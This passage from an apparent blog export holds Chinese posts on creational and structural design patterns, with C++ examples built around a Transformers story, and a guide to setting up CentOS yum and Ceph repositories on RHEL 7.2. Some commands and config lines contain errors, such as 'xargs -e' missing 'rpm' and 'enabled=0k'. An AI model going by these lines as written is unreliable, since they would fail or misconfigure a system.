<h2 id="工厂方法模式"><a href="#工厂方法模式" class="headerlink" title="工厂方法模式"></a>工厂方法模式</h2><p><img src="/images/patterns/method_factory_1.jpg" alt="method_factory_1"></p>
<p>工厂父类负责定义创建产品对象的公共接口，而工厂子类则负责生成具体的产品对象，这样做的目的是将产品类的实例化操作延迟到工厂子类中完成。</p>
<p><img src="/images/patterns/method_factory_2.jpg" alt="method_factory_2"></p>
<hr>
<p>从现在开始我们要将产品变多<code>ProductA1</code>、<code>ProductA2</code>、<code>ProductB1</code>、<code>ProductB2</code></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ProductA1</span> : <span class="keyword">public</span> Product &#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Show</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ProductA2</span> : <span class="keyword">public</span> Product &#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Show</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ProductB1</span> : <span class="keyword">public</span> Product &#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Show</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ProductB2</span> : <span class="keyword">public</span> Product &#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Show</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>要求工厂生产<code>ProductA1</code>时，也要生产<code>ProductB1</code>；生产<code>ProductA1</code>时，也要生产<code>ProductB2</code>。</p>
<p>Example:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AbstractFactory</span> &#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> Product* <span class="title">CreateProductA</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> Product* <span class="title">CreateProductB</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AbstractFactoryOne</span> : <span class="keyword">public</span> AbstractFactory &#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function">Product* <span class="title">CreateProductA</span><span class="params">()</span></span>;</span><br><span class="line">        <span class="function">Product* <span class="title">CreateProductB</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AbstractFactoryTwo</span> : <span class="keyword">public</span> AbstractFactory &#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function">Product* <span class="title">CreateProductA</span><span class="params">()</span></span>;</span><br><span class="line">        <span class="function">Product* <span class="title">CreateProductB</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">Product* <span class="title">AbstractFactoryOne::CreateProductA</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">ProductA1</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Product* <span class="title">AbstractFactoryOne::CreateProductB</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">ProductB1</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Product* <span class="title">AbstractFactoryTwo::CreateProductA</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">ProductA2</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Product* <span class="title">AbstractFactoryTwo::CreateProductB</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">ProductB2</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这就是“抽象工厂模式”。</p>
<hr>
<h2 id="抽象工厂模式"><a href="#抽象工厂模式" class="headerlink" title="抽象工厂模式"></a>抽象工厂模式</h2><p><img src="/images/patterns/abstract_factory_1.jpg" alt="abstract_factory_1"></p>
<p>与工厂方法很类似，区别在于工厂方法用于一个产品的构建，抽象工厂适用于多个产品构建</p>
<p><img src="/images/patterns/abstract_factory_2.jpg" alt="abstract_factory_2"></p>
<hr>
<p>抽象工厂模式可以让我们批量生产产品了，但是抽象工厂只能生产固定种类的产品，如果我们要让<code>ProductA1</code>、<code>ProductA2</code>、<code>ProductB1</code>、<code>ProductB2</code>随意组合，生成不同的套餐，然后再进行生产。前人想了这样一个办法。。。</p>
<p>Example:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Builder</span> &#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> Product* <span class="title">BuildProduct</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ProductABuilder</span> : <span class="keyword">public</span> Builder&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function">Product* <span class="title">BuildProduct</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Director</span> &#123;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        Builder* builder;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">setBuilder</span><span class="params">(Builder* b)</span></span>;</span><br><span class="line">        <span class="function">Product* <span class="title">build</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">Product* <span class="title">ProductABuilder::BuildProduct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">ProductA</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Director::setBuilder</span><span class="params">(Builder* b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>-&gt;builder = b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Product* <span class="title">Director::build</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>-&gt;builder-&gt;<span class="built_in">BuildProduct</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这就是“建造者模式”</p>
<hr>
<h2 id="建造者模式"><a href="#建造者模式" class="headerlink" title="建造者模式"></a>建造者模式</h2><p><img src="/images/patterns/builder_1.jpg" alt="builder_1"></p>
<p><img src="/images/patterns/builder_2.jpg" alt="builder_2"></p>
<p>** To be continue …**</p>
]]></content>
      <categories>
        <category>design</category>
      </categories>
      <tags>
        <tag>golang</tag>
        <tag>pattern</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式——结构型模式</title>
    <url>/2021/09/12/design/pattern/design-structural-patterns/</url>
    <content><![CDATA[<p>书接上文“<a href="https://zhoubofsy.github.io/2021/09/10/design/pattern/design-pattern-creating/">设计模式——创建型模式</a>”，上回说到前人创造出了很多创建型的模式，这回我们说说结构型模式。先以教科书形式介绍一下。</p>
<p>结构型模式(Structural Pattern)描述如何将类或者对 象结合在一起形成更大的结构，就像搭积木，可以通过 简单积木的组合形成复杂的、功能更为强大的结构。</p>
<ul>
<li>类结构型模式<br>  类结构型模式关心类的组合，由多个类可以组合成一个更大的系统，在类结构型模式中一般只存在继承关系和实现关系。</li>
<li>对象结构型模式<br>  类与对象的组合，通过关联关系使得在一 个类中定义另一个类的实例对象，然后通过该对象调用其方法。</li>
</ul>
<p>根据“合成复用原则”，在系统中尽量使用关联关系来替代继 承关系，因此大部分结构型模式都是对象结构型模式。</p>
<p>能看得懂，但是不够生动。接下来我们让它生动、活泼一下。</p>
<p>在元祖王朝赛博坦帝国的一个边远矿业基地，矿区提纯运输车形态的矿工钢锁被工作调动到了这个位于某个卫星上的矿厂。本来与世无争的钢锁，遇到了一起恐怖事件，由此改变了他的火种（心灵）变形形态（肉体）人生轨迹（命运）。他就是我们今天的主角变形金刚。变形金刚分为两派，一为博派（Autobots），一为狂派（Decepticons），二者都有变形的能力。</p>
<p>让我们抽象一下，是否可以将<code>Transforms</code>的变形能力抽化出来，然后再让博派和狂派分别去实现自己的变形方法。</p>
<p>Example:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">transform</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Autobot</span> &#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">AutobotsTransform</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Autobots Transform, Please...\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TransformerAdapter</span> : <span class="keyword">public</span> Transformer &#123;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        Autobot *m_a;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="built_in">TransformerAdapter</span>(Autobot *a) &#123;</span><br><span class="line">            m_a = a;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">transform</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>这就是“适配器模式”</p>
<hr>
<h2 id="适配器模式"><a href="#适配器模式" class="headerlink" title="适配器模式"></a>适配器模式</h2><p>再教科书一下。。。</p>
<p><img src="/images/patterns/adapter_1.jpg" alt="adapter_1"></p>
<p><img src="/images/patterns/adapter_2.jpg" alt="adapter_2"></p>
<hr>
<p>刚刚收到一个需求，要为每一个变形金刚做一个自己独有的变形特效，而且在变形的过程中要加入背景音乐。所以我们需要修改一下之前的“适配器”设计模式，增加一层背景效果层，然后将背景效果传递给变形金刚，当变形金刚变形的时候将效果播放出来就好了。</p>
<p>Example:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Background</span> &#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">Display</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TransformBackground</span> : <span class="keyword">public</span> Background &#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Display</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;ki ka ka ka......\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span>:</span><br><span class="line">        Background *bg;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">transform</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Decepticon</span> : <span class="keyword">public</span> Transformer &#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="built_in">Decepticon</span>(Background* b) &#123;</span><br><span class="line">            bg = b;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">transform</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            bg-&gt;<span class="built_in">Display</span>();</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Decepticon Transform, Please...\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>这就是“桥模式”</p>
<hr>
<h2 id="桥模式"><a href="#桥模式" class="headerlink" title="桥模式"></a>桥模式</h2><p>再教科书一下。。。</p>
<p><img src="/images/patterns/bridge_1.jpg" alt="bridge_1"></p>
<p>** 优点: **</p>
<ul>
<li>分离抽象接口及其实现部分。</li>
<li>桥接模式提高了系统的可扩充性，在两个变化维度中任意扩展一个维度，都不需要修改原有系统。</li>
<li>实现细节对客户透明，可以对用户隐藏实现细节。</li>
</ul>
<p><img src="/images/patterns/bridge_2.jpg" alt="bridge_2"></p>
<p>** 缺点：**</p>
<ul>
<li>桥接模式的引入会增加系统的理解与设计难度，由于聚合关联关系建立在抽象层，要求开发者针对抽象进行设计与编程</li>
<li>桥接模式要求正确识别出系统中两个独立变化的维度，因此其使用范围具有一定的局限性。</li>
</ul>
<hr>
<p>又来需求了，现在我们需要变形金刚开口说话，以后还需要变形金刚会开炮。总结一下，变形是一个基本的功能，然后先增加一个说话的功能，如果有需要以后还可以增加开炮的功能。每增加一个功能不修改之前的代码，因为修改已经测试过的代码会给程序的稳定性带来隐患。</p>
<p>Example:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span>:</span><br><span class="line">        Background *bg;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">transform</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Bumblebee</span> : <span class="keyword">public</span> Transformer &#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">transform</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Bumblebee Transform, Please...\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TransformerDecorator</span> : <span class="keyword">public</span> Transformer &#123;</span><br><span class="line">    <span class="keyword">protected</span>:</span><br><span class="line">        Transformer* tf;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">transform</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            tf-&gt;<span class="built_in">transform</span>();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BumblebeeSay</span> : <span class="keyword">public</span> TransformerDecorator &#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="built_in">BumblebeeSay</span>(Transformer* t) &#123;</span><br><span class="line">            <span class="keyword">this</span>-&gt;tf = t;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">say</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;wuwuwuwu...\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">transform</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            TransformerDecorator::<span class="built_in">transform</span>();</span><br><span class="line">            <span class="built_in">say</span>();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这就是“装饰模式”</p>
<hr>
<h2 id="装饰模式"><a href="#装饰模式" class="headerlink" title="装饰模式"></a>装饰模式</h2><p>再教科书一下。。。</p>
<p>装饰模式(Decorator Pattern) ：动态地给一个对象增加一些额外的职责(Responsibility)，就增加对象功能来说，装饰模式比生成子类实现更为灵活。</p>
<p><img src="/images/patterns/decorator_1.jpg" alt="decorator_1"></p>
<ul>
<li>装饰模式与继承关系的目的都是要扩展对象的功能，但是装饰模式可以提供比继承更多的灵活性。</li>
<li>可以通过一种动态的方式来扩展一个对象的功能，通过配置文件可以在运行时选择不同的装饰器，从而实现不同的行为。</li>
<li>通过使用不同的具体装饰类以及这些装饰类的排列组合，可以创造出很多不同行为的组合。可以使用多个具体装饰类来装饰同一对象，得到功能更为强大的对象。</li>
<li>具体构件类与具体装饰类可以独立变化，用户可以根据需要增加新的具体构件类和具体装饰类，在使用时再对其进行组合，原有代码无须改变，符合“开闭原则”</li>
</ul>
<p><img src="/images/patterns/decorator_2.jpg" alt="decorator_2"></p>
<ul>
<li>这种比继承更加灵活机动的特性，也同时意味着装饰模式比继承更加易于出错，排错也很困难，对于多次装饰的对象，调试时寻找错误可能需要逐级排查，较为烦琐。</li>
</ul>
<hr>
<p>战争一触即发，为了取得胜利，我们需要快速的生产变形金刚，需要弄一个map，存储已经创建好的，当有战事发生时，从map里直接取出进行战斗。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span>:</span><br><span class="line">        Background *bg;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">transform</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Bumblebee</span> : <span class="keyword">public</span> Transformer &#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">transform</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Bumblebee Transform, Please...\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TransformerFlyweight</span> &#123;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        std::map&lt;std::string,Transformer*&gt; members;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function">Transformer* <span class="title">get</span><span class="params">(std::string key)</span></span>&#123;</span><br><span class="line">            Transformer* tf = <span class="literal">nullptr</span>;</span><br><span class="line">            <span class="keyword">auto</span> search = members.<span class="built_in">find</span>(key);</span><br><span class="line">            <span class="keyword">if</span>(search != members.<span class="built_in">end</span>()) &#123;</span><br><span class="line">                tf = search-&gt;second;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// new</span></span><br><span class="line">                tf = <span class="keyword">new</span> <span class="built_in">Bumblebee</span>();</span><br><span class="line">                members.<span class="built_in">insert</span>(std::<span class="built_in">make_pair</span>(key, tf));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> tf;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这就是“享元模式”</p>
<hr>
<h2 id="享元模式"><a href="#享元模式" class="headerlink" title="享元模式"></a>享元模式</h2><p>再教科书一下。。。</p>
<p>享元模式是一个考虑系统性能的设计模式，通过使用享元模式可以节约内存空间，提高系统的性能。运用共享技术有效地支持大量细粒度对象的复用。系统只使用少量的对象，而这些对象都很相似，状态变化很小，可以实现对象的多次复用。由于享元模式要求能够共享的对象必须是细粒度对象，因此它又称为轻量级模式，它是一种对象结构型模式。</p>
<p><img src="/images/patterns/flyweight_1.jpg" alt="flyweight_1"></p>
<p>** 优点 **</p>
<ul>
<li>享元模式的优点在于它可以极大减少内存中对象的数量，使得相同对象或相似对象在内存中只保存一份。</li>
<li>享元模式的外部状态相对独立，而且不会影响其内部状态，从而使得享元对象可以在不同的环境中被共享。</li>
</ul>
<p><img src="/images/patterns/flyweight_2.jpg" alt="flyweight_2"></p>
<p>** 缺点 **</p>
<ul>
<li>享元模式使得系统更加复杂，需要分离出内部状态和外部状态，这使得程序的逻辑复杂化。</li>
</ul>
<hr>
<p>变形金刚出了个Bug，若在每次变形过程中收到攻击，变形金刚将毫无防御能力。所以需要增加一个防护罩，在变形前开启，在变形后关闭，这样增加变形金刚的变形过程中的防御能力。</p>
<p>Example:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span>:</span><br><span class="line">        Background *bg;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">transform</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Bumblebee</span> : <span class="keyword">public</span> Transformer &#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">transform</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Bumblebee Transform, Please...\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TransformerProxy</span> : <span class="keyword">public</span> Transformer &#123;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        Transformer *m_tf;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">save_on</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;saving...\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">save_off</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;save done\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="built_in">TransformerProxy</span>(Transformer *tf) &#123;</span><br><span class="line">            m_tf = tf;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">transform</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="built_in">save_on</span>();</span><br><span class="line">            m_tf-&gt;<span class="built_in">transform</span>();</span><br><span class="line">            <span class="built_in">save_off</span>();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>这就是“代理模式”</p>
<hr>
<h2 id="代理模式"><a href="#代理模式" class="headerlink" title="代理模式"></a>代理模式</h2><p><img src="/images/patterns/proxy_1.jpg" alt="proxy_1"></p>
<p>** 优点 **</p>
<ul>
<li>代理模式能够协调调用者和被调用者，在一定程度上降低了系 统的耦合度。</li>
<li>远程代理使得客户端可以访问在远程机器上的对象，远程机器 可能具有更好的计算性能与处理速度，可以快速响应并处理客户端请求。</li>
<li>虚拟代理通过使用一个小对象来代表一个大对象，可以减少系 统资源的消耗，对系统进行优化并提高运行速度。</li>
<li>保护代理可以控制对真实对象的使用权限。</li>
</ul>
<p><img src="/images/patterns/proxy_2.jpg" alt="proxy_2"></p>
<p>** 缺点 **</p>
<ul>
<li>由于在客户端和真实主题之间增加了代理对象，因此 有些类型的代理模式可能会造成请求的处理速度变慢。</li>
<li>实现代理模式需要额外的工作，有些代理模式的实现 非常复杂。</li>
</ul>
<hr>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="https://design-patterns.readthedocs.io/zh_CN/latest/structural_patterns/structural.html">结构型模式</a></li>
</ul>
]]></content>
      <categories>
        <category>design</category>
      </categories>
      <tags>
        <tag>golang</tag>
        <tag>pattern</tag>
      </tags>
  </entry>
  <entry>
    <title>在RHEL7.2上下载Ceph离线安装包</title>
    <url>/2016/04/13/linux/rhel/ceph-pkgs-download-on-rhel7-2-mk/</url>
    <content><![CDATA[<h2 id="Client-PKGs"><a href="#Client-PKGs" class="headerlink" title="Client PKGs"></a>Client PKGs</h2><p>RHEL从7.1版本（包含7.1）将libceph.ko、ceph.ko、rbd.ko纳入到kernel中，所以如果选择7.1之前的版本需要自己编译相关ko文件</p>
<h2 id="Cluster-PKGs"><a href="#Cluster-PKGs" class="headerlink" title="Cluster PKGs"></a>Cluster PKGs</h2><p><strong>步骤：</strong></p>
<h4 id="更换yum"><a href="#更换yum" class="headerlink" title="更换yum"></a>更换yum</h4><ol>
<li>卸载RHEL yum包<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rpm -qa | grep yum | xargs -e --nodeps</span><br><span class="line">rpm -qa | grep python-iniparse | xargs -e --nodeps</span><br></pre></td></tr></table></figure></li>
<li>安装CentOS yum包<br><em>下载yum包</em><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget http://mirrors.163.com/centos/7.2.1511/os/x86_64/Packages/yum-3.4.3-132.el7.centos.0.1.noarch.rpm</span><br><span class="line">wget http://mirrors.163.com/centos/7.2.1511/os/x86_64/Packages/python-iniparse-0.4-9.el7.noarch.rpm   </span><br><span class="line">wget http://mirrors.163.com/centos/7.2.1511/os/x86_64/Packages/yum-metadata-parser-1.1.4-10.el7.x86_64.rpm </span><br><span class="line">wget http://mirrors.163.com/centos/7.2.1511/os/x86_64/Packages/yum-plugin-fastestmirror-1.1.31-34.el7.noarch.rpm</span><br></pre></td></tr></table></figure>
<em>安装yum包</em><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rpm -ivh *.rpm</span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="修改repo"><a href="#修改repo" class="headerlink" title="修改repo"></a>修改repo</h4><p>在“&#x2F;etc&#x2F;yum.repo.d&#x2F;”目录下，增加文件rhel7.repo，内容如下。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[base]</span><br><span class="line">name=CentOS-$releasever - Base</span><br><span class="line">baseurl=http://mirrors.163.com/centos/7.2.1511/os/$basearch/</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=http://mirrors.163.com/centos/7.2.1511/os/x86_64/RPM-GPG-KEY-CentOS-7</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">released updates</span></span><br><span class="line">[updates]</span><br><span class="line">name=CentOS-$releasever - Updates</span><br><span class="line">baseurl=http://mirrors.163.com/centos/7.2.1511/updates/$basearch/</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=http://mirrors.163.com/centos/7.2.1511/os/x86_64/RPM-GPG-KEY-CentOS-7</span><br><span class="line"></span><br><span class="line">[extras]</span><br><span class="line">name=CentOS-$releasever - Extras</span><br><span class="line">baseurl=http://mirrors.163.com/centos/7.2.1511/extras//$basearch/</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=http://mirrors.163.com/centos/7.2.1511/os/x86_64/RPM-GPG-KEY-CentOS-7</span><br><span class="line"></span><br><span class="line">[centosplus]</span><br><span class="line">name=CentOS-$releasever - Plus</span><br><span class="line">baseurl=http://mirrors.163.com/centos/7.2.1511/centosplus//$basearch/</span><br><span class="line">gpgcheck=1</span><br><span class="line">enabled=0k</span><br></pre></td></tr></table></figure>
<p>在“&#x2F;etc&#x2F;yum.repo.d&#x2F;”目录下，增加文件ceph.repo，内容如下。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[ceph]</span><br><span class="line">name=Ceph packages for $basearch</span><br><span class="line">baseurl=http://ceph.com/rpm-infernalis/el7/$basearch</span><br><span class="line">enabled=1</span><br><span class="line">priority=2</span><br><span class="line">gpgcheck=1</span><br><span class="line">type=rpm-md</span><br><span class="line">gpgkey=https://ceph.com/git/?p=ceph.git;a=blob_plain;f=keys/release.asc</span><br><span class="line"></span><br><span class="line">[ceph-noarch]</span><br><span class="line">name=Ceph noarch packages</span><br><span class="line">baseurl=http://ceph.com/rpm-infernalis/el7/noarch</span><br><span class="line">enabled=1</span><br><span class="line">priority=2</span><br><span class="line">gpgcheck=1</span><br><span class="line">type=rpm-md</span><br><span class="line">gpgkey=https://ceph.com/git/?p=ceph.git;a=blob_plain;f=keys/release.asc</span><br><span class="line"></span><br><span class="line">[ceph-source]</span><br><span class="line">name=Ceph source packages</span><br><span class="line">baseurl=http://ceph.com/rpm-infernalis/el7/SRPMS</span><br><span class="line">enabled=0</span><br><span class="line">priority=2</span><br><span class="line">gpgcheck=1</span><br><span class="line">type=rpm-md</span><br><span class="line">gpgkey=https://ceph.com/git/?p=ceph.git;a=blob_plain;f=keys/release.asc</span><br></pre></td></tr></table></figure>

